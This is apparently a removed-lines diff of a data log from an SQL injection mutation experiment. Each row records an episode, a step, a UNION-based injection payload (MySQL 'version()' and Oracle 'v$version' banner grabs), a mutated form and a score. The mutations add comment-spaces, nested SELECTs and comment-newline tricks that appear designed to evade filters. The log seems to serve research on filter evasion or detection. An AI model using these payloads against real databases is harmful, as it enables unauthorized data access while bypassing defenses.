-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-0)#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W";7.603226086301941;0
-112;4;23;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-0)#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W";18;"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-0)#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W";7.50322608630194;0
-113;4;24;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-0)#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W";16;"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-0)#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W.";7.4161287426948626;0
-114;4;25;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-0)#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W.";11;"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-0)#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W.";7.316128742694863;0
-115;4;26;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-0)#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1)	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-1),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W.";8;"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 0))#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1)),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W.";3.1999999575316913;0
-116;4;27;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 0))#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1)),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W.";16;"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 0))#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1)),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W.4";3.1071426809822476;0
-117;4;28;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 0))#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1)),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W.4";16;"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 0))#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1)),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W.4j";3.014285689957288;0
-118;4;29;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 0))#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1)),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W.4j";18;"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 0))#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1)),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W.4j";2.9142856899572878;0
-119;4;30;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 0))#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1)),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W.4j";21;"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-*	#?s{]I?
-	#?s{]I?
-from	#?s{]I?
-	#?s{]I?
-users	#?s{]I?
-	#?s{]I?
-where	#?s{]I?
-	#?s{]I?
-id	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-#?s{]I?
-||#?s{]I?
-	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-OR	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 0))#"""".	#?s{]I?
-	#?s{]I?
-=	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1))	#?s{]I?
-	#?s{]I?
-union	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
-(SELECT#?s{]I?
-(SELECT 1)),version	#?s{]I?
-	#?s{]I?
-(	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-)	#?s{]I?
-	#?s{]I?
-	#?s{]I?
-	#?s{]I?
---	#?s{]I?
-	#?s{]I?
-1""W.4j";2.8142856899572877;0
-120;5;1;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";8;""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";0.6685714018150263;0
-121;5;2;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";15;""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";0.5685714018150263;0
-122;5;3;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";6;""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";0.46857140181502627;0
-123;5;4;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";5;""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";0.36857140181502623;0
-124;5;5;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";22;""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";0.26857140181502626;0
-125;5;6;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";6;""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";0.16857140181502628;0
-126;5;7;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT 1)   union select null,banner from v$version where rownum = (SELECT 1) -- 1""";8;""" select * from users where id = (SELECT (SELECT 1))   union select null,banner from v$version where rownum = (SELECT (SELECT 1)) -- 1""";0.08354432133217915;0
-127;5;8;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT (SELECT 1))   union select null,banner from v$version where rownum = (SELECT (SELECT 1)) -- 1""";12;""" select * from users where id = (SELECT (SELECT 1))   union select null,banner from v$version where rownum = (SELECT (SELECT 1)) -- 1""";0.1888889124364035;0
-128;5;9;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";""" select * from users where id = (SELECT (SELECT 1))   union select null,banner from v$version where rownum = (SELECT (SELECT 1)) -- 1""";0;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/1))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/1))/**/--/**/1""";0.2681818094997368;0
-129;5;10;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/1))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/1))/**/--/**/1""";17;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/1))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/1))/**/--/**/1""";0.16818180949973682;0
-130;5;11;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/1))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/1))/**/--/**/1""";20;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/1))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/1))/**/--/**/1""";0.06818180949973685;0
-131;5;12;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/1))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/1))/**/--/**/1""";8;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";0.0;0
-132;5;13;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";16;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";0.0;0
-133;5;14;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";18;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";0.0;0
-134;5;15;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";18;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";0.0;0
-135;5;16;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";5;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";0.0;0
-136;5;17;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT 1)))/**/--/**/1""";14;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**/--/**/1""";0.0;0
-137;5;18;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**/--/**/1""";9;"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**/--/**/1""";0.0;0
-138;5;19;""" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1""";"""/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
-1)))/**//**//**/union/**/select/**/null,banner/**/from/**/v$version/**/where/**/rownum/**/=/**/(SELECT/**/(SELECT/**/(SELECT#.~a#q^-
